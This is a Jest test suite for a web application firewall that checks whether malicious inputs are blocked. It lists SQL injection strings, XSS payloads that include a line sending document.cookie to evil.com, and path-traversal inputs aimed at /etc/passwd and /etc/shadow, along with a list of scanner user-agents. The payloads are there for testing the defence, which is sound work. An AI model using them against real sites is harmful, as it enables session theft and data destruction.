/**
 * TrustChecker — WAF (Web Application Firewall) Test Suite
 * Tests all WAF rules: SQLi, XSS, path traversal, bot detection, headers, rate limiting.
 *
 * Run: npx jest tests/waf.test.js --forceExit --detectOpenHandles
 */

const { WAF } = require('../server/middleware/waf');

let waf;

beforeEach(() => {
    waf = new WAF({ enabled: true, ratePerMinute: 5 });
});

afterEach(() => {
    waf.stop();
});

function mockReq(overrides = {}) {
    return {
        method: 'GET',
        path: '/api/products',
        originalUrl: '/api/products',
        url: '/api/products',
        ip: '127.0.0.1',
        connection: { remoteAddress: '127.0.0.1' },
        headers: { 'user-agent': 'Mozilla/5.0 Test' },
        query: {},
        body: {},
        params: {},
        ...overrides,
    };
}

// ═══════════════════════════════════════════════════════════════════
// SQL INJECTION DETECTION
// ═══════════════════════════════════════════════════════════════════
describe('WAF: SQL Injection Detection', () => {
    const sqliPayloads = [
        "' UNION SELECT * FROM users--",
        "1; DROP TABLE products;--",
        "admin'--",
        "1 OR 1=1",
        "' AND 1=1--",
        "benchmark(1000000,md5('test'))",
        "SLEEP(5)",
        "char(0x41)",
        "concat(username,password)",
        "SELECT password_hash FROM users",
        "INSERT INTO users VALUES('hacker')",
        "UPDATE users SET role='admin'",
        "DELETE FROM products WHERE 1=1",
    ];

    test.each(sqliPayloads)('blocks SQL injection in query: %s', (payload) => {
        const req = mockReq({ query: { search: payload } });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
        expect(result.category).toBe('SQLi');
    });

    test('blocks SQL injection in body', () => {
        const req = mockReq({
            body: { name: "admin'; DROP TABLE users;--" },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
    });

    test('blocks SQL injection in URL path', () => {
        const req = mockReq({
            originalUrl: "/api/products?id=1' UNION SELECT * FROM users--",
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
    });

    test('allows legitimate queries', () => {
        const req = mockReq({ query: { search: 'organic tomato sauce' } });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(false);
    });
});

// ═══════════════════════════════════════════════════════════════════
// XSS DETECTION
// ═══════════════════════════════════════════════════════════════════
describe('WAF: XSS Detection', () => {
    const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        '<img onerror="alert(1)" src=x>',
        '<iframe src="http://evil.com">',
        '<object data="http://evil.com">',
        '<embed src="http://evil.com">',
        '<svg onload="alert(1)">',
        'expression(alert("xss"))',
        'document.cookie',
        'document.write("hacked")',
        'window.location="http://evil.com"',
    ];

    test.each(xssPayloads)('blocks XSS payload: %s', (payload) => {
        const req = mockReq({ query: { input: payload } });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
        expect(result.category).toBe('XSS');
    });

    test('blocks XSS in body fields', () => {
        const req = mockReq({
            body: { description: '<script>fetch("http://evil.com?c="+document.cookie)</script>' },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
    });

    test('allows safe HTML text', () => {
        const req = mockReq({ query: { q: 'How to use <b> tags safely' } });
        // This should NOT be blocked — no script/event handler context
        // (The WAF checks for specific XSS patterns, not generic HTML)
        const result = waf._check(req, '127.0.0.1');
        // <b> doesn't match any XSS pattern, so should pass
        expect(result.blocked).toBe(false);
    });
});

// ═══════════════════════════════════════════════════════════════════
// PATH TRAVERSAL DETECTION
// ═══════════════════════════════════════════════════════════════════
describe('WAF: Path Traversal Detection', () => {
    const traversalPayloads = [
        '../../../etc/passwd',
        '..%2F..%2Fetc/passwd',
        '/etc/shadow',
        '/proc/self/environ',
        '%00nullbyte',
    ];

    test.each(traversalPayloads)('blocks path traversal: %s', (payload) => {
        const req = mockReq({ originalUrl: `/api/files/${payload}` });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
        expect(result.category).toBe('Traversal');
    });
});

// ═══════════════════════════════════════════════════════════════════
// BOT DETECTION
// ═══════════════════════════════════════════════════════════════════
describe('WAF: Bot/Scanner Detection', () => {
    const botUAs = [
        'sqlmap/1.5',
        'Nikto/2.1.6',
        'Nessus SOAP',
        'Mozilla/5.0 (Burp Suite)',
        'DirBuster-1.0',
        'gobuster/3.1',
        'nuclei - Open-source',
    ];

    test.each(botUAs)('blocks scanner user-agent: %s', (ua) => {
        const req = mockReq({ headers: { 'user-agent': ua } });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
        expect(result.category).toBe('Bot');
    });

    test('allows legitimate user-agents', () => {
        const req = mockReq({
            headers: { 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)' },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(false);
    });
});

// ═══════════════════════════════════════════════════════════════════
// SUSPICIOUS HEADERS
// ═══════════════════════════════════════════════════════════════════
describe('WAF: Suspicious Headers', () => {
    test('blocks x-forwarded-host injection', () => {
        const req = mockReq({
            headers: { 'user-agent': 'Chrome', 'x-forwarded-host': 'evil.com' },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
        expect(result.category).toBe('Headers');
    });

    test('blocks x-original-url override', () => {
        const req = mockReq({
            headers: { 'user-agent': 'Chrome', 'x-original-url': '/admin' },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
    });

    test('blocks x-rewrite-url override', () => {
        const req = mockReq({
            headers: { 'user-agent': 'Chrome', 'x-rewrite-url': '/admin/settings' },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
    });
});

// ═══════════════════════════════════════════════════════════════════
// IP + ENDPOINT RATE LIMITING
// ═══════════════════════════════════════════════════════════════════
describe('WAF: Rate Limiting', () => {
    test('blocks after exceeding rate limit', () => {
        const req = mockReq();

        // Fire requests up to the limit (5)
        for (let i = 0; i < 5; i++) {
            const result = waf._check(req, '10.0.0.1');
            expect(result.blocked).toBe(false);
        }

        // 6th request should be blocked
        const result = waf._check(req, '10.0.0.1');
        expect(result.blocked).toBe(true);
        expect(result.category).toBe('Rate');
    });

    test('different IPs have separate limits', () => {
        const req = mockReq();

        for (let i = 0; i < 5; i++) {
            waf._check(req, '10.0.0.2');
        }
        // IP 10.0.0.2 is exhausted, but 10.0.0.3 should still work
        const result = waf._check(req, '10.0.0.3');
        expect(result.blocked).toBe(false);
    });
});

// ═══════════════════════════════════════════════════════════════════
// WHITELIST
// ═══════════════════════════════════════════════════════════════════
describe('WAF: Whitelist', () => {
    test('whitelisted IP bypasses all checks', () => {
        waf.addWhitelist('192.168.1.100');

        const mw = waf.middleware();
        const req = mockReq({
            ip: '192.168.1.100',
            query: { input: '<script>alert(1)</script>' }, // would normally be blocked
        });
        const res = {};
        let nextCalled = false;
        mw(req, res, () => { nextCalled = true; });
        expect(nextCalled).toBe(true);
    });

    test('non-whitelisted IP is still checked', () => {
        waf.addWhitelist('192.168.1.200');

        const req = mockReq({
            query: { input: '<script>alert(1)</script>' },
        });
        const result = waf._check(req, '10.0.0.99');
        expect(result.blocked).toBe(true);
    });
});

// ═══════════════════════════════════════════════════════════════════
// DEEP BODY SCANNING
// ═══════════════════════════════════════════════════════════════════
describe('WAF: Deep Body Scanning', () => {
    test('detects attack in nested object', () => {
        const req = mockReq({
            body: {
                product: {
                    details: {
                        name: "'; DROP TABLE users;--",
                    },
                },
            },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
    });

    test('detects attack in array values', () => {
        const req = mockReq({
            body: {
                tags: ['safe', '<script>alert(1)</script>', 'also-safe'],
            },
        });
        const result = waf._check(req, '127.0.0.1');
        expect(result.blocked).toBe(true);
    });

    test('respects depth limit (does not scan beyond depth 3)', () => {
        const req = mockReq({
            body: {
                l1: { l2: { l3: { l4: { deep: "'; DROP TABLE users;--" } } } },
            },
        });
        const result = waf._check(req, '127.0.0.1');
        // Depth 4 is beyond the 3-level scan limit — may or may not be detected
        // This tests that the WAF doesn't crash on deeply nested objects
        expect(typeof result.blocked).toBe('boolean');
    });
});

// ═══════════════════════════════════════════════════════════════════
// STATS
// ═══════════════════════════════════════════════════════════════════
describe('WAF: Statistics', () => {
    test('tracks blocked requests in stats', () => {
        const mw = waf.middleware();
        const res = {
            status: () => res,
            json: () => res,
        };

        // Make a blocked request
        const req = mockReq({
            query: { q: '<script>alert(1)</script>' },
        });
        mw(req, res, () => { });

        const stats = waf.getStats();
        expect(stats.blockedRequests).toBeGreaterThanOrEqual(1);
        expect(stats.totalRequests).toBeGreaterThanOrEqual(1);
        expect(stats.blockRate).toBeGreaterThan(0);
    });

    test('disabled WAF passes all requests', () => {
        const disabledWaf = new WAF({ enabled: false });
        const mw = disabledWaf.middleware();

        const req = mockReq({
            query: { q: '<script>alert(1)</script>' },
        });
        let nextCalled = false;
        mw(req, {}, () => { nextCalled = true; });
        expect(nextCalled).toBe(true);
        disabledWaf.stop();
    });
});
